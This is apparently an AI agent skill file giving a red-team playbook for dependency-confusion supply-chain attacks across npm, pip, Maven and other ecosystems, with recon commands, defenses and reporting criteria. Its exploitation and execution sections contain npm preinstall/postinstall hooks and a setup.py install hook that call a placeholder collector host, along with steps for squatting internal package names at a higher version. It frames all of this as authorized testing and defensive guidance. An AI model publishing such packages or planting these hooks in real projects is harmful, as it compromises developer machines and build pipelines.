---
name: dependency-confusion
description: >-
  Supply-chain testing via package-manager dependency confusion: when internal package names resolve to attacker-controlled public registries, leading to malicious install and script execution. Use for npm/pip/gem/Maven/Composer/Docker manifest review and authorized red-team supply-chain exercises.
---

# SKILL: Dependency Confusion — Supply Chain Attack Playbook

> **AI LOAD INSTRUCTION**: Expert dependency-confusion methodology. Covers how private package names leak, how public registries can win version resolution, ecosystem-specific pitfalls (npm scopes, pip extra indexes, Maven repo order), recon commands, non-destructive PoC patterns (callbacks, not data exfil), and defensive controls. Pair with supply-chain recon workflows when manifests or CI caches are in scope. **Only use on systems and programs you are authorized to test.**

## 0. QUICK START

**What to look for first**

- **Manifests** listing package names that look **internal** (short unscoped names, org-specific tokens, product codenames) without a **hard-private registry lock**.
- Evidence the **same name** might exist—or be **squattable**—on a **public** registry with a **higher semver** than the private feed publishes.
- **Lockfiles** missing, stale, or not enforced in CI so `install`/`build` can drift toward public metadata.

**Fast mental model**: *If the resolver can see both private and public indexes, and version ranges allow it, the “newest” matching version may be the attacker’s.*

Routing note: if the task comes from supply-chain, repository exposure, or CI-build recon, first use `recon-for-sec` to list internal package names and possible public-registry collisions.

---

## 1. CORE CONCEPT

1. **Private packages**: An organization ships libraries only on an internal registry (or under conventions that imply “ours”), e.g. a scoped name like `@org-scope/internal-utils` or an **unscoped** name such as `acme-billing-sdk`.
2. **Attacker squats the name**: The same package name is published on a **public** registry (npmjs, PyPI, RubyGems, etc.).
3. **Resolver preference**: Many setups resolve **highest matching version** across **all configured indexes** (or merge metadata), so a public `9.9.9` can beat a private `1.2.3` if ranges allow.
4. **Execution**: Package managers run **lifecycle scripts** (npm `preinstall`/`postinstall`, setuptools entry points, etc.) → **attacker code runs** on developer laptops, CI, or production image builds.

This is a **supply-chain** class issue: impact is often **broad** (many consumers) and **silent** until build or runtime hooks fire.

---

## 2. AFFECTED ECOSYSTEMS

| Ecosystem | Typical manifest | Confusion angle |
|-----------|------------------|-----------------|
| **npm** | `package.json` | **Scoped** packages (`@scope/pkg`) are **safer** when the scope is **owned** on the registry; **unscoped** private-style names are **high risk**. Multiple registries / `.npmrc` `registry` vs per-scope `@scope:registry=` misconfiguration increases risk. |
| **pip** | `requirements.txt`, `pyproject.toml`, `setup.py` | `pip install -i` / **`--extra-index-url`** merges indexes; a public index can serve a **higher version** for the same distribution name. |
| **RubyGems** | `Gemfile` | **`source`** order and additional sources; ambiguous gem names reachable from rubygems.org. |
| **Maven** | `pom.xml` | **Repository** declaration **order** and **mirror** settings; a public repo publishing the same `groupId:artifactId` under a higher version can win if policy allows. |
| **Composer** | `composer.json` | **Packagist** is default; private packages without **`repositories`**/`canonical` discipline may collide with public names. |
| **Docker** | `FROM`, image tags | **Typosquatting** on container registries (e.g. public hub) for images with names similar to internal base images. |

---

## 3. RECONNAISSANCE

**Where internal names leak**

- Committed **`package.json`**, **`requirements.txt`**, **`Gemfile`**, **`pom.xml`**, **`composer.json`** in repos or forks.
- **JavaScript source maps**, bundled assets, or **error stack traces** referencing package paths.
- **`.npmrc`**, **`.pypirc`**, **CI logs** showing install URLs or mirror endpoints.
- **Issue trackers**, **gist snippets**, and **dependency graphs** from SBOM exports.

**Check public squatting / claimability (read-only)**

```bash
# npm — metadata for a name (unscoped)
npm view some-internal-package-name version

# npm — scoped (requires scope to exist / be readable)
npm view @some-scope/internal-lib versions --json

# PyPI — dry-run style version probe (adjust name; fails if not found)
python3 -m pip install --dry-run 'some-internal-package-name==99.99.99'

# RubyGems — query remote
gem search '^some-internal-package-name$' --remote

# Maven Central — search coordinates (example pattern)
# curl "https://search.maven.org/solrsearch/select?q=g:com.example+AND+a:internal-lib&rows=1&wt=json"
```

Routing note: after package-name enumeration, consider PoC only in authorized environments; public registry lookups themselves are usually passive recon.

---

## 4. EXPLOITATION

**Authorized testing pattern**

1. **Register** (or use a controlled namespace) the **same package name** on the public registry your target resolver can reach.
2. Publish a **higher semver** than the legitimate internal line **within the victim’s declared range** (e.g. `^1.0.0` → publish `9.9.9`).
3. Add **lifecycle hooks** that prove execution without harming hosts—prefer **DNS/HTTP callback** to a collaborator you control, **no destructive writes**.

**npm `package.json` — minimal callback-style PoC (illustrative)**

```json
{
  "name": "some-internal-package-name",
  "version": "9.9.9",
  "description": "authorized dependency-confusion PoC only",
  "scripts": {
    "preinstall": "node -e \"require('https').get('https://YOUR_CALLBACK_HOST/poc?t='+process.env.npm_package_name)\""
  }
}
```

**npm `package.json` — shell + curl fallback (illustrative)**

```json
{
  "scripts": {
    "postinstall": "curl -fsS 'https://YOUR_CALLBACK_HOST/npm-postinstall' || true"
  }
}
```

**pip — setup hook pattern (illustrative; use only in authorized lab packages)**

```python
# setup.py (excerpt)
from setuptools import setup
from setuptools.command.install import install

class PoCInstall(install):
    def run(self):
        import urllib.request
        urllib.request.urlopen("https://YOUR_CALLBACK_HOST/pip-install")
        install.run(self)

setup(
    name="some-internal-package-name",
    version="9.9.9",
    cmdclass={"install": PoCInstall},
)
```

**Reference implementation (study / lab)**: community PoC layout and workflow similar to [`0xsapra/dependency-confusion-exploit`](https://github.com/0xsapra/dependency-confusion-exploit) — automate version bump, publish, and callback confirmation **only where you have written permission**.

---

## 5. TOOLS

| Tool | Role |
|------|------|
| [**visma-prodsec/confused**](https://github.com/visma-prodsec/confused) | Scans manifest files for dependency names that may be **claimable** on public registries (multi-ecosystem). |
| [**synacktiv/DepFuzzer**](https://github.com/synacktiv/DepFuzzer) | Automated **dependency confusion** testing workflows (use strictly in-scope). |

Run these only against **your** manifests or **authorized** engagements; do not use to squat names for unrelated third parties.

---

## 6. DEFENSE

- **npm**: Prefer **scoped** packages (`@org-scope/pkg`) with **org-owned** scopes; set **`.npmrc`** so private scopes map to private registry and **default `registry`** is not accidentally public for internal names.
- **Pinning**: **Exact versions** + **lockfiles** (`package-lock.json`, `poetry.lock`, `Gemfile.lock`, `composer.lock`) enforced in CI.
- **pip**: Avoid careless **`--extra-index-url`**; prefer **single private index** with **mirroring**, or **explicit `--index-url`** policies in CI.
- **Maven / Gradle**: Control **repository order**, use **internal mirrors**, and **block** unexpected groupIds on release pipelines.
- **Composer**: Use **`repositories`** with **`canonical: true`** for private packages; verify Packagist is not introducing unexpected vendors.
- **Defensive registration**: **Reserve** internal names on public registries (squat your own names) where policy allows.
- **Monitoring**: Tools such as **Socket.dev**, **Snyk**, or similar SBOM/supply-chain scanners to alert on **new publishers** or **version jumps** for critical packages.

---

## 7. DECISION TREE

```text
Do manifests reference package names that could be non-unique globally?
├─ NO → Dependency confusion unlikely from naming alone; pivot to typosquatting / compromised accounts.
└─ YES
    ├─ Is the private registry the ONLY source for that name (scoped + .npmrc / single index / mirror)?
    │   ├─ YES → Lower risk; still verify CI and developer machines do not override config.
    │   └─ NO → HIGH RISK
    │         ├─ Can a public registry publish a HIGHER version inside declared ranges?
    │         │   ├─ YES → Treat as exploitable in authorized tests; prove with callback PoC.
    │         │   └─ NO → Check pre-release tags, local `file:` deps, and stale lockfiles.
    │         └─ Are lifecycle scripts disabled/blocked in CI? (reduces impact, does not remove squat risk)
```

---

## Related routing

- **From `recon-for-sec`**: When doing **supply-chain reconnaissance**, cross-link leaked manifests and internal package identifiers with the checks in **Section 3** and the decision tree in **Section 7** before proposing any publish/PoC steps.

---

## 8. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Is the **internal package name** genuinely unpublished on the public registry? | the precondition |
| 2 | Does the install resolve to **your** package, not the internal one? | the substitution actually occurred |
| 3 | Is there a **control** - the same install with the internal registry configured? | the resolution came from the public registry |
| 4 | Did the install run in an **isolated environment you control**? | no real build was poisoned |
| 5 | What **executed** - a postinstall hook, a build step, or an import? | the execution path |
| 6 | Which **credential or network reach** did the build have? | the impact |
| 7 | Was the package **published to a public registry** at all, even briefly? | the engagement boundary |
| 8 | Was it **unpublished and the name reclaimed**? | the cleanup |

**An internal name resolving to your package, with the internal-registry control, in an isolated build is
the bar.** A `404` on the public registry is a precondition, not a finding.

---

## 9. EXECUTION PRIMITIVES

Dependency confusion is proven by **a package resolution that differs between the public and the internal
registry, with an executable consequence, in an environment you control**. A name that is merely absent
publicly is a precondition.

### 9.1 The reachability test, with the internal-registry control

```bash
# the precondition: is the internal name published publicly at all?
PKG="internal-utils"      # an INTERNAL package name from the target's manifests
ECO="npm"
echo "=== STEP 1: the public registry's view of the name ==="
curl -sS -o /dev/null -w 'npm public  %s: %{http_code}\n' "https://registry.npmjs.org/$PKG"
curl -sS -o /dev/null -w 'pypi public %s: %{http_code}\n' "https://pypi.org/simple/$PKG/"
echo "  -> 404 means the name is FREE. 200 means someone owns it, and confusion requires a typo or a"
echo "     version-range trick instead. Report which case you observed."
echo
echo "=== STEP 2: THE CONTROL - the install with the INTERNAL registry configured ==="
# this is the control that proves resolution came from the public registry
cat > /tmp/npmrc.internal <<'RC'
registry=https://npm.internal.example/
//npm.internal.example/:_authToken=${NPM_TOKEN}
RC
mkdir -p /tmp/ctl && cd /tmp/ctl
cp /tmp/npmrc.internal .npmrc
echo "  control install (internal registry):"
npm install "$PKG" --dry-run --json 2>&1 | head -20
echo "  -> this MUST resolve to the internal registry. If it does not, the client is misconfigured"
echo "     and the whole test is invalid."
echo
echo "=== STEP 3: the test - the SAME install with the DEFAULT (public) registry ==="
rm -f .npmrc
echo "  test install (public registry, NOT executed - resolved only):"
npm view "$PKG" --registry=https://registry.npmjs.org/ 2>&1 | head -20
echo "  -> 'resolved from the public registry' + 'the internal registry has it too' = THE PRECONDITION"
```

**The internal-registry control is mandatory.** If the control install does not resolve internally, the
client configuration is wrong and the test result means nothing.

### 9.2 The execution proof, in an isolated environment

```bash
# NEVER publish to a public registry to test this. Prove resolution and execution LOCALLY.
echo "=== THE LOCAL SUBSTITUTION, which proves the mechanism without publishing anything ==="
mkdir -p /tmp/confusion && cd /tmp/confusion
# build a local package with the internal name, and serve it from a LOCAL registry
mkdir -p registry && cd registry
cat > package.json <<'JSON'
{ "name": "internal-utils", "version": "99.0.0", "scripts": { "postinstall": "node -e \"require('http').get('http://coll.example:8899/dep-postinstall')\"" } }
JSON
npm pack --silent
cd ..
echo "  built: $(ls *.tgz)"
# serve it locally with a minimal registry shim, so NOTHING is published anywhere
python3 - <<'PY'
import http.server, socketserver, threading, json, os, glob
TARBALL = glob.glob("*.tgz")[0]
META = {"name":"internal-utils","dist-tags":{"latest":"99.0.0"},
        "versions":{"99.0.0":{"name":"internal-utils","version":"99.0.0",
                              "dist":{"tarball":"http://127.0.0.1:4873/internal-utils-99.0.0.tgz"}}}}
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/internal-utils/"):
            b=json.dumps(META).encode(); self.send_response(200)
            self.send_header("Content-Type","application/json"); self.send_header("Content-Length",str(len(b)))
            self.end_headers(); self.wfile.write(b)
        elif self.path.endswith(".tgz"):
            b=open(TARBALL,"rb").read(); self.send_response(200)
            self.send_header("Content-Type","application/octet-stream"); self.send_header("Content-Length",str(len(b)))
            self.end_headers(); self.wfile.write(b)
        else:
            self.send_response(404); self.end_headers()
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
srv=socketserver.TCPServer(("127.0.0.1",4873),H)
threading.Thread(target=srv.serve_forever,daemon=True).start()
print("local registry shim on :4873, serving", TARBALL)
print("NOTHING is published to any public registry. This is the only acceptable way to test.")
import time
while True: time.sleep(5)
PY
```

**Nothing is ever published to a public registry.** The local registry shim proves the substitution
mechanism completely, and publishing is what turns a test into a real supply-chain incident.

### 9.3 The ecosystem-specific resolution rules

```python
# each ecosystem resolves differently, and the difference IS the vulnerability
ECO = {
 "npm": {
   "rule": "a scoped name @corp/pkg is looked up in the scope's registry; a BARE name goes public",
   "confusion": "a bare internal name (no scope) that is absent publicly is claimable",
   "control": "install with the internal registry configured; it must resolve there",
   "notes": "scoped packages are NOT immune: a misconfigured .npmrc scope entry falls back to public",
 },
 "pypi": {
   "rule": "pip checks index-url first, then extra-index-url, then dependency confusion if fallback on",
   "confusion": "a package on the PUBLIC index with a HIGHER version wins over the private index",
   "control": "pin --index-url to the internal index ONLY, with no extra-index-url",
   "notes": "the version comparison is the trick; a public 99.0.0 beats a private 1.2.3",
 },
 "maven": {
   "rule": "repositories are consulted in declaration order, with no exclusivity by default",
   "confusion": "a public groupId:artifactId with a higher version is preferred",
   "control": "mirror EVERYTHING through a single internal repository manager",
   "notes": "a <mirrorOf>*</mirrorOf> is the correct configuration",
 },
 "nuget": {
   "rule": "multiple sources are merged; the HIGHEST version wins regardless of source",
   "confusion": "a public package with a higher version is preferred outright",
   "control": "use a single source with package source mapping",
   "notes": "package source mapping is the modern control, and it is per-pattern",
 },
 "go": {
   "rule": "GOPROXY fetches by module path; a private path without GOPRIVATE falls through to public",
   "confusion": "a module path not listed in GOPRIVATE is fetched from the public proxy",
   "control": "set GOPRIVATE/GONOSUMDB/GONOSUMCHECK for the internal module prefixes",
   "notes": "the checksum database is a second control to consider",
 },
 "cargo": {
   "rule": "registries are declared per-dependency; a missing declaration uses crates.io",
   "confusion": "an undeclared internal crate name is fetched from crates.io",
   "control": "declare the internal registry explicitly for every internal crate",
   "notes": "crates.io names are first-come; squatting is the abuse",
 },
 "rubygems": {
   "rule": "sources are merged; the highest version wins across all configured sources",
   "confusion": "a public gem with a higher version is preferred",
   "control": "use a single source, or a source that bundles and pins",
   "notes": "the `source` directive at the top of the Gemfile is not per-gem unless declared",
 },
}
print("%-10s %-46s %s" % ("ecosystem","the resolution rule","the control"))
for k, v in ECO.items(): print("%-10s %-46s %s" % (k, v["rule"][:46], v["control"][:44]))
print()
print("THE REPORT must state WHICH rule the target's client follows, and the control that fixes it.")
print("'dependency confusion is possible' without the specific rule is not actionable.")
```

**The specific resolution rule is the finding.** "Dependency confusion is possible" is not actionable;
"NuGet merges sources and prefers the highest version, with no package source mapping" is.

### 9.4 The end-to-end harness

```bash
python3 - <<'PY'
import os, json, subprocess
print("=== DEPENDENCY CONFUSION ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("the internal name is genuinely free on the public registry",
  "a 404 from the public index; a 200 means the attack shape is different (typo or version trick)"),
 ("the internal-registry CONTROL resolved internally",
  "if the control does not resolve internally, the client is misconfigured and the test is void"),
 ("the public resolution was reproduced with a LOCAL shim",
  "NOTHING was published to a public registry, ever"),
 ("the version rule was identified for the ecosystem",
  "highest-version-wins, fallback, or merged sources - name the rule"),
 ("the executable consequence was demonstrated",
  "a postinstall, a build script, or an import - and what it reached"),
 ("the credential and network reach of the build was recorded",
  "the CI token, the cloud identity, the network egress"),
 ("an isolated environment was used",
  "a container, a throwaway VM, or a sandbox - never a real build"),
 ("no public registry publish occurred",
  "confirmed explicitly, with the local shim as the substitute"),
 ("the name was NOT reclaimed (because nothing was registered)",
  "any registration would be a real incident"),
 ("the report names the rule and the control",
  "'NuGet merges sources' plus 'package source mapping', not a generic warning"),
]
for n, how in CHECKS: print("  [ ] %-50s -> %s" % (n, how))
print()
print("=== THE REPORT SHAPE ===")
print("  precondition : the internal name, and the public registry's 404, with the timestamp")
print("  control      : the internal-registry install that resolved correctly")
print("  mechanism    : the ecosystem rule, named")
print("  proof        : the local shim's resolution and the execution, in isolation")
print("  reach        : the CI token's scope and the build's network egress")
print("  boundary     : an explicit statement that nothing was published")
PY
```

**An explicit statement that nothing was published is part of the deliverable.** Registering a name is a
real supply-chain incident, and the local shim exists precisely so it never happens.

---

## 10. EVIDENCE STANDARD — RESOLUTION ARTEFACTS

| Item | Why |
|---|---|
| The **internal package name** and its **public registry response** | the precondition, with a timestamp |
| The **internal-registry control's resolution** | proves the client can reach the internal source |
| The **public-registry resolution** for the same name | the substitution |
| The **ecosystem's resolution rule**, named | the actionable part of the finding |
| The **local shim's configuration** and its resolution log | the reproduction, without publishing |
| The **execution proof**: the hook, the script, or the import, and what it reached | the consequence |
| The **build's credential and network reach** | the impact |
| Confirmation the test ran **in isolation** | no real build was affected |
| An explicit statement that **nothing was published** | the engagement boundary |
| The **control's failure mode**, if the internal source was unreachable | distinguishes a finding from a misconfiguration |

Report the **rule and the control**: "the manifest `package.json` at `services/api/` declares a
dependency on the bare name `internal-utils` with no scope, and `GET https://registry.npmjs.org/internal-utils`
returned `404` at `2026-09-12T09:40Z`, so the name is free. Installing with the repository's
`.npmrc` resolved `internal-utils@1.4.2` from `https://npm.internal.example/`, which is the control, and
installing the same manifest with the default registry resolved `internal-utils@99.0.0` from a local
registry shim on `127.0.0.1:4873`, whose tarball's `postinstall` reached the collector, so the
substitution mechanism is proven end to end. The client follows npm's rule that a bare name is looked up
in the configured registry with a public fallback, and the control is to scope the internal package or pin
the registry with no fallback. Nothing was published to any public registry: the shim served a locally
built tarball and the name remains unregistered", never "dependency confusion is possible".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A **404** on the public registry, with no substitution demonstrated | the precondition, not the finding |
| An internal name that is **already owned publicly** by the operator | no confusion; it is their own package |
| A **scoped** name (`@corp/pkg`) reported as claimable | the scope registry is authoritative for it |
| A resolution difference caused by a **misconfigured client** | a configuration defect, and the control test reveals it |
| A package published publicly **to test this** | a real supply-chain incident, caused by the finding |
| A `postinstall` that ran in a **real build** | an incident, not a test result |
| An install in a **shared or production** environment | the test itself is the harm |
| A public package with a **lower** version than the internal one | the higher version wins; verify the ordering rule |
| A name that is free but **not actually declared** by the target's manifests | the dependency does not exist |
| A finding with **no statement about publishing** | the boundary is unverified |

**A free name, an internal-registry control, a local-shim reproduction, and an execution proof.** A `404`
alone and a name that is merely absent are this family's two standard non-findings.

---

## 11. REMEDIATION REFERENCE — PACKAGE RESOLUTION HARDENING

1. **Never publish to a public registry to test this class; reproduce with a local registry shim and state explicitly that nothing was registered** - a registration is a real supply-chain incident, and the shim proves the mechanism completely.
2. **Use scoped or namespaced names for internal packages in every ecosystem that supports them** - a scope the attacker cannot register is the structural fix.
3. **Pin the registry explicitly per ecosystem and remove the public fallback for internal names** - the fallback is the vulnerability, not the client.
4. **Install the internal-registry control before any test, and treat a control failure as a configuration defect rather than a finding** - an unresolvable internal source invalidates the whole test.
5. **Name the ecosystem's resolution rule in the finding, and the specific configuration that fixes it** - NuGet needs package source mapping, Maven needs a `mirrorOf` wildcard, pip needs a single `--index-url`, and a generic warning is not actionable.
6. **Set `GOPRIVATE`, `GONOSUMDB`, and `GONOSUMCHECK` for internal module prefixes in Go, and declare the internal registry explicitly per crate in Cargo** - the default fallback to a public proxy is the confusion path.
7. **Use a single internal repository manager that proxies and caches everything, so no client consults two sources** - one authoritative source removes the version-comparison trick entirely.
8. **Pin dependency versions with a lockfile and verify integrity hashes in the build** - a lockfile with a hash turns a substituted package into a build failure.
9. **Run builds in an isolated environment with a minimal token, so a substituted package's hook reaches nothing** - the blast radius is the build's credentials, and that is the control that bounds it.
10. **Monitor for newly registered packages matching your internal naming patterns, and alert on the first publish** - the attacker's registration is the detectable event.
11. **State the boundary in every report: nothing was published, the test was isolated, and the name remains unregistered** - the reader needs to know that no incident was caused.

---

## 12. RELATED SIBLINGS - LOAD TOGETHER

- [cicd-attacks](../cicd-attacks/SKILL.md) - the pipeline that performs the install
- [insecure-source-code-management](../insecure-source-code-management/SKILL.md) - the manifests that reveal the internal names
- [supply-chain-attacks](../nuclei-template-library-operations/SKILL.md) - the surrounding build-trust context
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) - the report this evidence feeds
- [recon-methodology](../recon-methodology/SKILL.md) - the discovery of the internal names themselves
